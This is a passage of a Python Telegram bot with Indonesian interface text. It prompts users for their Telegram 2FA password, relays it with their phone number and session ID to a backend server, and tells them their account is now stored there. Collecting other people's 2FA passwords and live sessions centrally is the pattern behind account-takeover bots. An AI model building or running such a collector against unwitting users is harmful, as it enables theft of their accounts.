             f"📞 <b>Nomor:</b> <code>{session['phone_number']}</code>\n"
             "🛡️ <b>Verifikasi:</b> Password 2FA\n\n"
             "⏳ <b>Sedang memverifikasi dengan server Telegram...</b>\n"
             "🔐 <i>Proses ini mungkin memakan waktu beberapa detik</i>",
        parse_mode=ParseMode.HTML
    )
    
    # Prepare payload untuk backend API
    payload = {
        "phone_number": session["phone_number"],
        "password": password,
        "session_id": session["session_id"]
    }
    
    logger.info(f"Sending 2FA verification to backend for user {user_id}")
    
    # Make API request ke endpoint /password
    result = await make_api_request("/password", method="POST", data=payload, timeout=300)
    
    if result.get("success"):
        # Berhasil dengan 2FA
        await clear_user_session(user_id)
        
        logger.info(f"Account successfully added for user {user_id} with 2FA")
        
        await loading_msg.edit_text(
            "🎉 <b>Akun Berhasil Ditambahkan dengan 2FA!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 <b>Nomor:</b> <code>{session['phone_number']}</code>\n"
            f"👤 <b>Nama:</b> {session['fullname']}\n"
            f"🆔 <b>Session ID:</b> <code>{session['session_id']}</code>\n"
            f"🔒 <b>2FA:</b> ✅ Terverifikasi\n"
            f"⏰ <b>Waktu:</b> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n\n"
            "✅ <b>Akun Telegram Anda telah berhasil tersimpan di sistem!</b>\n"
            "🛡️ Keamanan 2FA telah diverifikasi dengan sukses.\n"
            "🔐 Data telah dienkripsi dan disimpan dengan aman.\n\n"
            "🚀 <b>Akun siap digunakan dengan proteksi penuh!</b>",
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.HTML
        )
    else:
        # Gagal verifikasi password
        session["password_attempts"] += 1
        remaining_attempts = 3 - session["password_attempts"]
        error_msg = result.get("error", "Password 2FA tidak valid")
        
        logger.warning(f"2FA verification failed for user {user_id}: {error_msg}, attempts: {session['password_attempts']}")
        
        if remaining_attempts > 0:
            await loading_msg.edit_text(
                f"❌ <b>Password 2FA Salah</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ <b>Error:</b> {error_msg}\n"
                f"🔄 <b>Sisa percobaan:</b> {remaining_attempts}x\n\n"
                "💡 <b>Tips:</b>\n"
                "• Pastikan password sama dengan yang di Telegram\n"
                "• Password bersifat case-sensitive\n"
                "• Coba ingat password yang pernah Anda buat\n"
                "• Jangan gunakan spasi di awal atau akhir\n\n"
                "🔑 <b>Silakan masukkan password 2FA yang benar:</b>",
                reply_markup=get_cancel_keyboard(),
                parse_mode=ParseMode.HTML
            )
        else:
            await clear_user_session(user_id)
            await loading_msg.edit_text(
                "❌ <b>Verifikasi Password 2FA Gagal</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🚫 <b>Alasan:</b> {error_msg}\n"
                "⚠️ <b>Maksimal percobaan tercapai (3x)</b>\n\n"
                "🔧 <b>Kemungkinan Penyebab:</b>\n"
                "• Password 2FA yang dimasukkan salah\n"
                "• Lupa password yang pernah dibuat\n"
                "• Akun menggunakan metode 2FA yang berbeda\n\n"
                "🔄 <b>Untuk mencoba lagi:</b>\n"
                "1️⃣ Pastikan Anda ingat password 2FA yang benar\n"
                "2️⃣ Klik 'Kembali ke Menu Utama'\n"
                "3️⃣ Mulai proses penambahan akun dari awal\n\n"
                "❓ <b>Butuh bantuan?</b> Hubungi administrator.",
                reply_markup=get_main_menu_keyboard(),
                parse_mode=ParseMode.HTML
            )

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Handle semua error yang terjadi di bot"""
    logger.error(f"Update {update} caused error {context.error}")
    
    # Notify user jika memungkinkan
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "❌ <b>Terjadi Kesalahan Sistem</b>\n\n"
                "🔧 Bot mengalami error sementara.\n"
                "🔄 Silakan coba lagi dalam beberapa saat.\n\n"
                "💡 Jika masalah berlanjut, hubungi administrator.",
                reply_markup=get_main_menu_keyboard(),
                parse_mode=ParseMode.HTML
            )
        except:
            pass  # Ignore jika gagal kirim pesan error

# ========== SESSION CLEANUP ==========
async def cleanup_expired_sessions():
    """Cleanup sessions yang sudah expired (background task)"""
    while True:
        try:
            current_time = datetime.now(timezone.utc).timestamp()
            expired_users = []
            
            async with session_lock:
                for user_id, session in user_sessions.items():
                    # Hapus session yang lebih dari 1 jam tidak aktif
                    if current_time - session.get("created_at", 0) > 3600:
                        expired_users.append(user_id)
                
                for user_id in expired_users:
                    del user_sessions[user_id]
                    logger.info(f"Cleaned up expired session for user {user_id}")
            
            if expired_users:
                logger.info(f"Cleaned up {len(expired_users)} expired sessions")
            
        except Exception as e:
            logger.error(f"Error in session cleanup: {e}")
        
        # Cleanup setiap 30 menit
        await asyncio.sleep(1800)

# ========== MAIN FUNCTION ==========
def main():
    """Start the Telegram bot dengan konfigurasi lengkap"""
    
    print("🚀 Telegram Account Manager Bot")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"🔗 Backend URL: {BACKEND_URL}")
    print(f"👨‍💻 Admin IDs: {ADMIN_IDS}")
    print("⚡ Multi-user support: ENABLED")
    print("🔐 Security features: ENABLED")
    print("📊 Logging: ENABLED")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    # Validasi konfigurasi
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Bot token belum dikonfigurasi!")
        print("💡 Silakan edit BOT_TOKEN di bagian atas script")
        return
    
    if BACKEND_URL == "http://localhost:5000":
        print("⚠️  WARNING: Menggunakan backend URL default (localhost)")
        print("💡 Pastikan backend sudah berjalan di localhost:5000")
        print("   atau edit BACKEND_URL sesuai server Anda")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("status", status_command))
    
    # Add callback handlers
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Add message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start background cleanup task
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_expired_sessions())
    
    # Start the bot
    logger.info("🤖 Starting Telegram Account Manager Bot...")
    print("✅ Bot berhasil dijalankan!")
    print("📱 Silakan chat bot Anda di Telegram")
    print("🔄 Tekan Ctrl+C untuk menghentikan bot")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    # Run bot dengan polling
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        poll_interval=1.0,
        timeout=30,
        read_timeout=30,
        write_timeout=30,
        connect_timeout=30
    )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🔴 Bot dihentikan oleh user")
        logger.info("Bot stopped by user")
    except Exception as e:
        print(f"\n❌ Bot error: {e}")
        logger.error(f"Bot crashed: {e}")
    finally:
        print("👋 Terima kasih telah menggunakan bot ini!")
